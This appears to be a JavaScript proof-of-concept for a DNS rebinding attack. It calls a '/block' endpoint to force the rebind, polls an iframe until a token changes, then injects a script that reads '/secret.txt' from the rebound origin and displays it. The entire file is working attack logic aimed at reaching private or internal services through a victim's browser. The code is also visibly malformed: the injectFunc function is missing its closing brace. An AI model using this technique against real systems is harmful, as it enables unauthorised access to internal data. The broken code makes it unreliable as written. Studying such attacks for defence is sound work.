async function run() {
    // Wait for the iFrame to load
    while (true) {
        let frame = document.getElementById("frame")
        if (!frame) {
            await new Promise(r => setTimeout(r, 100))
            continue
        }
        break
    }
    frame.onload = onFrameLoad
    frame.src = `${window.location}token.txt`
}

function onFrameLoad() {
    // Keep refereshing the iFrame until the token changes, indicating that DNS rebinding has worked
    let token = "testtoken"
    let doc = frame.contentDocument || frame.contentWindow.document
    let content = doc.body.innerText.trim()
    console.log(content)
    console.log(token)
    if (content != token) { // Rebinding has worked
        injectScript(frame)
        return
    }

    // Refresh the frame to try again
    frame.src = `${window.location}token.txt`
}

function injectFunc() {
    fetch("/secret.txt")
        .then(r => r.text())
        .then(text => {
            alert(text)
        })

function injectScript(frame) {
    let doc = frame.contentDocument || frame.contentWindow.document
    let script = document.createElement("script")
    script.setAttribute("type", "text/javascript")
    script.innerHTML = `${injectFunc.toString()}; injectFunc()`
    doc.body.append(script)
}

// Block our IP address
fetch("/block")
    .finally(_ => {
        run()
    })
